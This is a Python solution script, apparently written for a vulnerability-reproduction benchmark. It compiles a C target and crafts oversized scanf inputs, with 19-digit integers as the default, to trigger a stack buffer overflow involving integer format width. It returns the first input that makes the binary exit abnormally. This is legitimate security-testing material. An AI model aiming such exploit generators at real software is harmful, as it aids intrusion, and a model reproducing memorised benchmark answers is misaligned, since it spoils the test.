import os
import tarfile
import tempfile
import subprocess
import shutil
import re
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow vulnerability.
        Strategies:
        1. Analyze source code (if available) to determine input format (e.g. scanf format string).
        2. Attempt to compile the target and verify crashes with candidate payloads.
        3. Fallback to a default payload based on vulnerability description (integer format overflow).
        """
        
        # Default payload derived from vulnerability description:
        # "The integer format can exceed 32 characters ... maximum width (up to 19 digits) ... maximum precision (up to 19 digits)"
        # 19 digits + space + 19 digits + newline = 40 bytes (Ground-truth length)
        default_payload = b"9999999999999999999 9999999999999999999\n"
        
        tmp_dir = tempfile.mkdtemp()
        work_dir = tmp_dir
        
        try:
            # Extract or copy source code to working directory
            if os.path.isfile(src_path) and (src_path.endswith('.tar.gz') or src_path.endswith('.tgz')):
                with tarfile.open(src_path, 'r:*') as tar:
                    tar.extractall(path=work_dir)
            elif os.path.isdir(src_path):
                shutil.rmtree(work_dir)
                shutil.copytree(src_path, work_dir)
            else:
                # Handle single file or other cases if necessary
                pass

            # Locate the driver file (file containing main function)
            driver_file = None
            c_files = []
            
            for root, dirs, files in os.walk(work_dir):
                for f in files:
                    if f.endswith('.c'):
                        path = os.path.join(root, f)
                        c_files.append(path)
                        try:
                            with open(path, 'r', encoding='utf-8', errors='ignore') as f_in:
                                content = f_in.read()
                                if "main" in content:
                                    driver_file = path
                        except:
                            pass
            
            # Analyze source for input format (specifically scanf patterns)
            scanf_payload = None
            if driver_file:
                try:
                    with open(driver_file, 'r', encoding='utf-8', errors='ignore') as f_in:
                        content = f_in.read()
                    
                    # Look for scanf usage
                    matches = re.findall(r'scanf\s*\(\s*"([^"]+)"', content)
                    if matches:
                        fmt = matches[0]
                        # Heuristic payload generation
                        parts = fmt.split('%')
                        if len(parts) > 1:
                            constructed = parts[0]
                            for i in range(1, len(parts)):
                                # Regex to match specifiers like d, lu, .10s, etc.
                                m = re.match(r'^([*0-9.]*[hlLjzt]*[diuoxXfeEgGacspn])(.*)', parts[i])
                                if m:
                                    specifier = m.group(1)
                                    suffix = m.group(2)
                                    # For integer/number types, use 19 nines
                                    if any(c in specifier for c in "diuoxXfeEgG"):
                                        constructed += "9" * 19
                                    # For strings, try to overflow
                                    elif 's' in specifier:
                                        constructed += "A" * 40
                                    # For chars
                                    elif 'c' in specifier:
                                        constructed += "A"
                                    else:
                                        constructed += "9" * 19
                                        
                                    constructed += suffix
                                else:
                                    # Handle escaped % or parse failure
                                    if parts[i].startswith('%'):
                                        constructed += "%" + parts[i][1:]
                                    else:
                                        constructed += "9" * 19
                            
                            constructed += "\n"
                            scanf_payload = constructed.encode()
                except:
                    pass

            # Attempt to compile and fuzz with candidates
            if driver_file:
                src_dir = os.path.dirname(driver_file)
                exe_path = os.path.join(src_dir, 'vuln_bin')
                
                # Compile all .c files in the directory
                srcs = [os.path.join(src_dir, f) for f in os.listdir(src_dir) if f.endswith('.c')]
                cmd = ["gcc", "-o", exe_path] + srcs + ["-w"] # -w to suppress warnings
                
                try:
                    subprocess.run(cmd, cwd=src_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
                except:
                    pass
                
                if os.path.exists(exe_path):
                    # Candidates to test
                    candidates = []
                    if scanf_payload:
                        candidates.append(scanf_payload)
                    candidates.append(default_payload)
                    # Variations
                    candidates.append(b"9999999999999999999,9999999999999999999\n")
                    candidates.append(b"9999999999999999999.9999999999999999999\n")
                    candidates.append(b"18446744073709551615 18446744073709551615\n")
                    
                    for cand in candidates:
                        try:
                            # Run the binary
                            ret = subprocess.run([exe_path], input=cand, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=1)
                            # If exit code is non-zero, assume crash/vulnerability triggered
                            if ret.returncode != 0:
                                return cand
                        except subprocess.TimeoutExpired:
                            pass
                        except Exception:
                            pass
            
            # If dynamic analysis failed, return the best static guess
            if scanf_payload:
                return scanf_payload
            return default_payload

        except Exception:
            # Fallback
            return default_payload
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)
